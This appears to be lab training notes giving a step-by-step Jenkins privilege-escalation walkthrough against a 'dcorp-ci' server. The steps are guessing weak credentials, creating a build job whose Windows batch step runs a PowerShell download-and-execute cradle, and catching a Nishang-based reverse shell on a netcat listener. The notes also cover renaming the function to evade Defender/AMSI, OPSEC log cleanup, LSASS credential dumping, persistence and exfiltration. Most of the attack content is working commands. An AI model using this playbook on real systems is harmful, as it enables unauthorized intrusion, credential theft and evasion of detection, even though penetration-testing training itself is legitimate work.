# Attack - Jenkins Privilege Escalation

**Date:** Friday, August 21, 2026
**Topic:** Escalating Privileges on dcorp-ci Server Using Jenkins Access

---

## Objective

**Goal:** Gain reverse shell and command execution on dcorp-ci Jenkins server

**Progression:**
```
Standard user access to network
    ↓
Access Jenkins web interface
    ↓
Identify weak credentials (builduser:builduser)
    ↓
Login to Jenkins
    ↓
Configure malicious build step
    ↓
Execute reverse shell
    ↓
Gain shell access as ciadmin (service account)
```

---

## Prerequisites

- Network access to Jenkins server (dcorp-ci:8080)
- Knowledge of default credentials or weak passwords
- Reverse shell payload (Invoke-PowerShellTcp)
- Web server on attacker VM to host payload
- Netcat listener to catch reverse shell
- Access to create/configure Jenkins projects

---

## Step 1: Access Jenkins Web Interface

**Jenkins URL:** http://dcorp-ci:8080

```
Navigate to:
http://172.16.3.11:8080 (or dcorp-ci IP address)

Jenkins dashboard should load
```

---

## Step 2: Enumerate Jenkins Users

**Navigate to "People" page:**

```
1. Click on "People" in left sidebar
2. View list of Jenkins users
3. Look for users with weak credentials
4. Common patterns:
   - username = password
   - simple passwords (123456, password, welcome, etc.)
   - default credentials (admin/admin)
```

---

### Users Found

```
Example users on Jenkins instance:
- builduser (potentially weak password)
- admin (might have strong password)
- serviceaccount (check for weak password)
- devuser (check for weak password)
```

---

## Step 3: Try Weak Credentials

**Jenkins has no password policy** → Users often use simple/default passwords

### Common Weak Credential Patterns

```
builduser : builduser  ← WORKS (username as password)
admin : admin          ← Try this
devuser : devuser      ← Try this
test : test            ← Try this
```

---

### Login with Weak Credentials

**Attempt login with builduser:builduser**

```
1. Navigate to Jenkins login page
2. Username: builduser
3. Password: builduser
4. Click "Sign In"

Result: Successfully logged in as builduser
```

---

## Step 4: Verify Build Configuration Permissions

**Check builduser capabilities:**

```
builduser has permissions to:
✓ Configure builds
✓ Add Build Steps
✓ Execute arbitrary commands
✓ Create new projects

This is enough to execute reverse shell!
```

---

## Step 5: Prepare Reverse Shell Payload

### Option 1: Use Modified Invoke-PowerShellTcp (Recommended)

**Modified script (Nishang's Invoke-PowerShellTcp):**

```powershell
# Original function name: Invoke-PowerShellTcp
# Modified to: Power (to bypass Windows Defender)

# File: Invoke-PowerShellTcp.ps1
# Location: Host on web server (http://172.16.100.X/Invoke-PowerShellTcp.ps1)

# Function definition:
function Power {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$IPAddress,
        
        [Parameter(Mandatory = $true)]
        [int]$Port,
        
        [switch]$Reverse
    )
    
    if ($Reverse) {
        # Connect back to attacker
        $socket = New-Object System.Net.Sockets.TcpClient
        $socket.Connect($IPAddress, $Port)
        # ... rest of reverse shell implementation
    }
}

# Call function:
Power -Reverse -IPAddress 172.16.100.X -Port 443
```

---

### Option 2: Download and Execute Cradle

**One-liner PowerShell reverse shell:**

```powershell
powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```

**Breakdown:**
```
iwr = Invoke-WebRequest (download script)
iex = Invoke-Expression (execute script)
-UseBasicParsing = Bypass IE first-run check
Power = Function call with parameters
-Reverse = Reverse connection mode
-IPAddress = Attacker IP (172.16.100.X)
-Port = Listener port (443)
```

---

## Step 6: Setup Web Server on Attacker VM

**Host reverse shell payload on attacker machine:**

### Using HFS (HTTP File Server)

```
1. Locate HFS binary:
   C:\AD\Tools\hfs.exe

2. Start HFS:
   C:\AD\Tools\hfs.exe

3. HFS window minimizes to system tray
   └─ Click up arrow on taskbar
   └─ Double-click HFS icon to restore

4. Add files to HFS:
   - Drag Invoke-PowerShellTcp.ps1 to HFS window
   - Or use "Files" → "Add files"

5. Note HFS URL:
   http://172.16.100.X:80/ (or configured port)

6. Test access:
   curl http://172.16.100.X/Invoke-PowerShellTcp.ps1
   └─ Should return script content
```

---

### Alternative: Using Python HTTP Server

```bash
# On attacker Linux machine
cd /path/to/payload/
python3 -m http.server 8080

# Access via:
# http://172.16.100.X:8080/Invoke-PowerShellTcp.ps1
```

---

## Step 7: Setup Netcat Listener

**Listen for reverse shell connection:**

```powershell
# On attacker VM (cmd.exe or PowerShell)
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

# Parameters:
# -l = Listen mode
# -v = Verbose (show connections)
# -p = Port (443)

# Output:
# listening on [any] 443 ...
```

---

**On Linux:**

```bash
nc -lvnp 443
# -n = Numeric only (don't resolve DNS)
```

---

## Step 8: Create Jenkins Project with Malicious Build Step

**Create new project on Jenkins:**

### Step 8.1: Create New Project

```
1. Jenkins Dashboard
2. Click "New Item" or "Create Job"
3. Enter Project Name: "reverse-shell-test"
4. Select "Freestyle job"
5. Click "OK"
```

---

### Step 8.2: Configure Build Step

**Add Windows Batch Command:**

```
1. In Project Configuration
2. Scroll to "Build" section
3. Click "Add build step"
4. Select "Execute Windows batch command"
5. Paste malicious command:

powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443
```

---

### Step 8.3: Full Command Example

```powershell
# Complete Windows Batch command for Jenkins:
powershell.exe -Command "iex (iwr http://172.16.100.15/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.15 -Port 443"
```

---

### Step 8.4: Save Project

```
1. Verify command is correct
2. Click "Save"
3. Project configuration complete
```

---

## Step 9: Execute Build and Catch Reverse Shell

**Trigger the malicious build:**

### Step 9.1: Start Build

```
1. On Jenkins project page
2. Click "Build Now"
3. Build starts immediately
```

---

### Step 9.2: Monitor Build Console

```
1. Click on build number (e.g., "#1")
2. Click "Console Output"
3. Watch for:
   - PowerShell execution
   - Script download (iwr)
   - Function call (Power)
   - Connection back to attacker
```

---

### Step 9.3: Catch Reverse Shell on Netcat Listener

**On attacker machine (netcat listener):**

```
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443

listening on [any] 443 ...

(After Jenkins build executes)

connect to [172.16.100.15] from dcorp-ci.dollarcorp.moneycorp.local [172.16.3.11] 12345

PS C:\Program Files (x86)\Jenkins\workspace\reverse-shell-test>
```

---

## Step 10: Verify Shell Access

**Inside reverse shell, execute commands:**

```powershell
# Check current user
$env:username
# Output: ciadmin

# Check computer name
$env:computername
# Output: DCORP-CI

# Check IP configuration
ipconfig
# Output: IP addresses and network config

# Verify admin access
whoami /groups
# Should show admin groups
```

---

## Complete Jenkins Privilege Escalation Workflow

```
PHASE 1: Reconnaissance
├─ Access Jenkins at http://dcorp-ci:8080
├─ Navigate to "People" page
├─ Enumerate users (builduser, admin, etc.)
└─ [COMPLETE]

PHASE 2: Credential Testing
├─ Identify weak password patterns
├─ Try username as password (builduser:builduser)
├─ Successfully login
└─ [COMPLETE]

PHASE 3: Payload Preparation
├─ Download Invoke-PowerShellTcp.ps1
├─ Rename function to "Power" (AMSI bypass)
├─ Prepare download-execute cradle
├─ Prepare reverse shell one-liner
└─ [COMPLETE]

PHASE 4: Infrastructure Setup
├─ Start HFS on attacker (port 80)
├─ Host Invoke-PowerShellTcp.ps1
├─ Start netcat listener (port 443)
├─ Verify both are working
└─ [COMPLETE]

PHASE 5: Build Configuration
├─ Create new Jenkins project
├─ Add Windows Batch build step
├─ Insert malicious PowerShell command
├─ Verify no typos or extra spaces
├─ Save project
└─ [COMPLETE]

PHASE 6: Exploitation
├─ Click "Build Now"
├─ Monitor Jenkins console output
├─ Check for errors in build log
├─ Wait for netcat connection
└─ [COMPLETE]

PHASE 7: Post-Exploitation
├─ Execute commands in reverse shell
├─ Verify user is ciadmin
├─ Check computer name (DCORP-CI)
├─ Enumerate network (ipconfig)
├─ Verify admin privileges
└─ SHELL ACCESS OBTAINED

RESULT: Reverse shell as ciadmin on dcorp-ci
        Ability to execute arbitrary commands
        Domain user credentials available for extraction
```

---

## Important Verification Checklist

**Before clicking "Build Now":**

```
☐ HFS web server is running
☐ Invoke-PowerShellTcp.ps1 hosted and accessible
☐ Can download file via browser or curl
☐ Netcat listener is running on port 443
☐ Firewall on attacker VM is disabled/exception added
☐ Windows Batch command in Jenkins has NO typos
☐ Windows Batch command has NO extra spaces
☐ IP addresses are correct (172.16.100.X)
☐ Port numbers are correct (443)
☐ Function name is correct (Power, not Invoke-PowerShellTcp)
☐ PowerShell command syntax is valid
☐ Project configuration saved successfully
```

---

## Troubleshooting

**If build fails or no reverse shell:**

### Check Jenkins Console Output

```
1. Click on build number
2. View "Console Output"
3. Look for error messages:
   - PowerShell execution errors
   - Script download failures (iwr error)
   - Function not found (Power -Reverse failed)
   - Network connection errors
```

---

### Common Errors

**Error: "The system cannot find the file specified"**
```
Cause: Command syntax error or PowerShell not in PATH
Fix: Use full path: C:\Windows\System32\powershell.exe
```

---

**Error: "iwr : The term 'iwr' is not recognized"**
```
Cause: PowerShell version too old (IWR needs v3+)
Fix: Use FullyQualifiedName: Invoke-WebRequest
```

---

**Error: "Power : The term 'Power' is not recognized"**
```
Cause: Function not defined in downloaded script
Fix: Verify script downloaded correctly
Fix: Add function call at end of script
Fix: Use correct function name
```

---

**Error: "Connection refused on port 443"**
```
Cause: Netcat listener not running
Fix: Start netcat before triggering build
Fix: Verify port 443 not blocked by firewall
Fix: Try different port (e.g., 8443)
```

---

**Error: No connection after build completes**
```
Cause: Script failed to execute on target
Fix: Check Jenkins console output for details
Fix: Verify web server accessible from dcorp-ci
Fix: Test connectivity: ping 172.16.100.X from dcorp-ci
Fix: Verify firewall on attacker allows inbound 443
```

---

## OPSEC Considerations

```
✓ Use legitimate Jenkins project name
✓ Modify Invoke-PowerShellTcp function name (PowerUp/Power/PSShell)
✓ Don't leave malicious builds in queue
✓ Clean up after execution (delete project)
✓ Use HTTPS if possible (port 443 suggests SSL)
✓ Use short-lived payloads
✓ Remove console output logs
✓ Use internal IPs to avoid logging
✓ Clean firewall logs if possible
```

---

## Alternative Methods

**If standard build doesn't work:**

### Method 1: Maven Build

```
Build type: Maven
Command: execute mvn powershell:exec
```

---

### Method 2: Groovy Script

```
Use Jenkins Groovy plugin:
Runtime.getRuntime().exec("powershell.exe ...")
```

---

### Method 3: Pipeline Job

```
Jenkins Pipeline with PowerShell step
stage('Build') {
    steps {
        powershell(script: 'iex (iwr http://...)')
    }
}
```

---

## Post-Exploitation

**With reverse shell access:**

```
1. Extract credentials from memory (LSASS)
   └─ ciadmin is service account
   └─ Credentials may be in memory

2. Escalate to domain admin
   └─ Use ciadmin credentials
   └─ Lateral movement to DC

3. Establish persistence
   └─ Create scheduled task
   └─ Add user to admins
   └─ Create backdoor account

4. Data exfiltration
   └─ Access to Jenkins jobs
   └─ Source code repositories
   └─ Build artifacts
```

---

## Command Reference

| Action | Command |
|---|---|
| Start HFS | `C:\AD\Tools\hfs.exe` |
| Start netcat listener | `C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 443` |
| Download payload | `iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing` |
| Execute payload | `iex (iwr http://... -UseBasicParsing);Power -Reverse -IPAddress X -Port 443` |
| Check user | `$env:username` |
| Check computer | `$env:computername` |
| Check network | `ipconfig` |
| Check groups | `whoami /groups` |

---

## Key Takeaway

```
JENKINS PRIVILEGE ESCALATION:
1. Identify Jenkins instance (port 8080)
2. Enumerate users via "People" page
3. Try weak credentials (username:username)
4. Login as builduser
5. Verify "Configure builds" permission
6. Prepare reverse shell payload
7. Setup web server (HFS) to host payload
8. Setup netcat listener on port 443
9. Create Jenkins project with malicious build step
10. Add Windows Batch command with PowerShell reverse shell
11. Click "Build Now" to trigger
12. Catch reverse shell as ciadmin
13. Verify shell access (whoami, ipconfig)
14. Establish persistence and escalate
```

---

## References

- [Jenkins Remote Code Execution](https://owasp.org/www-community/attacks/Remote_Code_Execution)
- [Nishang Invoke-PowerShellTcp](https://github.com/samratashok/nishang)
- [Windows Batch in Jenkins](https://plugins.jenkins.io/batch-task/)
- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Reverse%20Shell)
- [HFS (HTTP File Server)](http://www.rejetto.com/hfs/)

---

*Next: Domain Privilege Escalation via Jenkins Credentials*
